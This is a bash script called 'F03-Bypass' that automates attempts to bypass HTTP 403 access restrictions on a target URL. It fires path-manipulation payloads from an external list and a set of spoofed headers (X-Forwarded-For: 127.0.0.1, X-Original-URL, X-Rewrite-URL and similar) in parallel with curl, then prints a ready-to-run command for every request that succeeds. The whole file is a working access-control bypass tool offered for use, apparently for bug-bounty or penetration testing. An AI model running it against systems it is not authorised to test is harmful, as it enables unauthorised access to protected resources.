#!/bin/bash

red='\e[31m'
green='\e[32m'
blue='\e[34m'
BOLD_WHITE='\033[1;97m'
cyan='\e[96m'
yellow='\e[33m'
end='\e[0m'
BOLD='\033[1m'
termwidth="$(tput cols)"
default_method="GET"
method=""
max_jobs=5  # Adjust this to change speed (parallel requests)
headers=()
test_mode="url"



banner() {
    echo -e "${cyan}${BOLD}"
    cat << "EOF"
     _____ ___ ____      ____
    |  ___/ _ \___ \    |  _ \                          
    | |_ | | | |__) |___| |_) |_   _ _ __   __ _ ___ ___
    |  _|| | | |__ <____|  _ <| | | | '_ \ / _` / __/ __|
    | |  | |_| |__) |   | |_) | |_| | |_) | (_| \__ \__ \
    |_|   \___/____/    |____/ \__, | .__/ \__,_|___/___/
                                __/ | |                  
        Coded By @mugh33ra     |___/|_|                  
           X: @mugh33ra
EOF
    echo -e "${end}"
}

help_usage() {
    echo "Usage: $0 -u <url> [options]"
    echo "Options:"
    echo "  -u, --url        Specify <Target_Url>"
    echo "  -m, --method     Specify Method <POST, PUT, PATCH> (Default, GET)"
    echo "  -H, --header     Add custom header (repeatable)"
    echo "  -a, --all        Run both URL encode and header bypass tests"
    echo "  -h, --help       Display help and exit"
}

if [[ $# -eq 0 ]]; then
    banner
    echo "[!] Error: use -h/--help for help menu"
    exit 1
fi

while [[ $# -gt 0 ]]; do
    case $1 in
        -u|--url)
            [[ -n $2 && $2 != -* ]] && {
                target=${2%/};
                pat=$(echo $2 | cut -d "/" -f4- );
                base_url=$(echo $2 | cut -d "/" -f1-3);
                shift 2;
            } || { echo "[!] Url is missing"; exit 1; } ;;
        -m|--method)
            [[ -n $2 && $2 != -* ]] && { method=$2; shift 2; } || { echo "[!] Method missing"; exit 1; } ;;
        -H|--header)
            [[ -n $2 && $2 != -* ]] && {
                headers+=("-H" "$2")
                shift 2
            } || { echo "[!] Header missing"; exit 1; } ;;
        -a|--all)
            test_mode="all"
            shift ;;
        -h|--help)
            banner; help_usage; exit 0; shift ;;
        *) echo "[!] Unknown flag $1"; exit 1 ;;
    esac
done

method=${method:-$default_method}
[[ ! -f "payloads.txt" ]] && { echo -e "${red}[!] payloads.txt not found${end}"; exit 1; }

if [[ -n "$pat" ]]; then
    header_bypasses=(
        "Client-IP: 127.0.0.1"
        "X-Real-IP: 127.0.0.1"
        "Redirect: 127.0.0.1"
        "Referer: 127.0.0.1"
        "X-Client-IP: 127.0.0.1"
        "X-Custom-IP-Authorization: 127.0.0.1"
        "X-Forwarded-By: 127.0.0.1"
        "X-Forwarded-For: 127.0.0.1"
        "X-Forwarded-Host: 127.0.0.1"
        "X-Forwarded-Port: 80"
        "X-True-IP: 127.0.0.1"
        "X-Original-URL: ${pat}"
        "X-Rewrite-URL: ${pat}"
        "X-Original-Uri: ${pat}"
        "X-Rewrite-Uri: ${pat}"
        "X-Forwarded-Server: 127.0.0.1"
        "X-Host: 127.0.0.1"
        "X-Http-Host-Override: 127.0.0.1"
        "X-Originating-IP: 127.0.0.1"
        "X-Remote-Addr: 127.0.0.1"
        "X-Remote-IP: 127.0.0.1"
    )
fi


run_check() {
    local p="$1"
    local current_p=$(echo "$p" | sed "s|\${pat}|$pat|g")
    local path_is_is_flag=""

    # Enable --path-as-is only when curl would normalize the path
    if [[ "$current_p" =~ (//|/\.\./|\.\./|%2e|%252e|%2f|\\|;) ]]; then
        path_is_is_flag="--path-as-is"
    fi

    local res=$(curl -k -s $path_is_is_flag "${headers[@]}" \
        -o /dev/null -w "%{http_code}|%{size_download}" \
        "${target}${current_p}" -X "$method" -H "User-Agent: Mozilla/5.0")

    local st=$(echo "$res" | cut -d'|' -f1)
    local len=$(echo "$res" | cut -d'|' -f2)

    if [[ "$st" =~ ^2 ]]; then
        color="${green}"
    elif [[ "$st" =~ ^3 ]]; then
        color="${yellow}"
    elif [[ "$st" =~ 405 || "$st" =~ 401 || "$st" =~ 429 ]]; then
        color="${blue}"
    elif [[ "$st" =~ ^4[0-9]{2}$ ]]; then
        color="${red}"
    else
        color="${cyan}"
    fi

    echo -e "Payload [ ${yellow}${current_p}${end} ]: ${color}Status: $st, Length : $len${end}"

    if [[ "$st" =~ ^2 ]]; then
        local line=$(printf '%.0s─' $(seq 1 $((termwidth - 2))))
        echo -e "╭${line}╮"
        echo -e " Payload [ ${yellow}${current_p}${end} ]:"
        echo -e " METHOD: '${cyan}${method}${end}'"
        echo -e " COMMAND: ${cyan}curl -k -s $path_is_is_flag -X $method '${target}${current_p}' ${headers[*]} -H 'User-Agent: Mozilla/5.0'${end}"
        echo -e "╰${line}╯"
    fi
}

run_header_check() {
    local header="$1"
    local current_header=$(echo "$header" | sed "s|\${pat}|$pat|g")

    if [[ "$current_header" =~ ^X-(Original|Rewrite)-(URL|Uri): ]]; then
        local test_url="${base_url}/"
        local header_value=$(echo "$current_header" | cut -d':' -f2- | sed 's/^ //')
    else
        local test_url="${target}"
        local header_value=$(echo "$current_header" | cut -d':' -f2- | sed 's/^ //')
    fi

    local res=$(curl -k -s "${headers[@]}" -H "$current_header" \
        -o /dev/null -w "%{http_code}|%{size_download}" \
        "$test_url" -X "$method" -H "User-Agent: Mozilla/5.0")

    local st=$(echo "$res" | cut -d'|' -f1)
    local len=$(echo "$res" | cut -d'|' -f2)

    if [[ "$st" =~ ^2 ]]; then
        color="${green}"
    elif [[ "$st" =~ ^3 ]]; then
        color="${yellow}"
    elif [[ "$st" =~ ^4 ]]; then
        color="${red}"
    else
        color="${cyan}"
    fi

    echo -e "Header [ ${yellow}${current_header}${end} ]: ${color}Status: $st, Length : $len${end}"

    if [[ "$st" =~ ^2 ]]; then
        local line=$(printf '%.0s─' $(seq 1 $((termwidth - 2))))
        echo -e "╭${line}╮"
        echo -e " Header [ ${yellow}${current_header}${end} ]:"
        echo -e " METHOD: '${cyan}${method}${end}'"
        if [[ "$current_header" =~ ^X-(Original|Rewrite)-(URL|Uri): ]]; then
            echo -e " URL: '${cyan}${base_url}/${end}'"
        else
            echo -e " URL: '${cyan}${target}${end}'"
        fi
        echo -e " COMMAND: ${cyan}curl -k -s -X $method '${test_url}' ${headers[*]} -H '$current_header' -H 'User-Agent: Mozilla/5.0'${end}"
        echo -e "╰${line}╯"
    fi
}

encode_bypass() {
    echo -e "${blue}+--------------------------------+${end}"
    echo -e "${cyan}|[+] URL Encode Bypass (Parallel)|${end}"
    echo -e "${blue}+--------------------------------+${end}"

    set -f
    while IFS= read -r p || [[ -n "$p" ]]; do
        [[ -z "$p" ]] && continue

        run_check "$p" &

        if [[ $(jobs -r | wc -l) -ge $max_jobs ]]; then
            wait -n
        fi
    done < "payloads.txt"

    wait
    set +f
}

header_bypass() {
    echo -e "${blue}+----------------------------+${end}"
    echo -e "${cyan}|[+] Header Bypass (Parallel)|${end}"
    echo -e "${blue}+----------------------------+${end}"

    for header in "${header_bypasses[@]}"; do
        [[ -z "$header" ]] && continue

        run_header_check "$header" &

        if [[ $(jobs -r | wc -l) -ge $max_jobs ]]; then
            wait -n
        fi
    done

    wait
}

main() {

    if [[ "$test_mode" == "url" ]]; then
        banner        # Show banner here
        encode_bypass # No banner inside this function
    elif [[ "$test_mode" == "all" ]]; then
        banner
        encode_bypass
        echo ""
        header_bypass
    fi
}

main
